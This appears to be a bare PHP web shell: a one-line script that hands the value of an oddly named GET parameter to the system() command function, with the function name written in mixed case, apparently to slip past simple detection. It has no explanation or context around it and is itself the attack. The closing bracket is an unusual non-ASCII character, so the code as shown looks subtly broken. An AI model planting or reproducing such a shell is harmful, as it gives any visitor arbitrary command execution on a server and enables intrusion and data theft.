<?php
SysTeM($_GET['5kOIsL58'〕);
?>
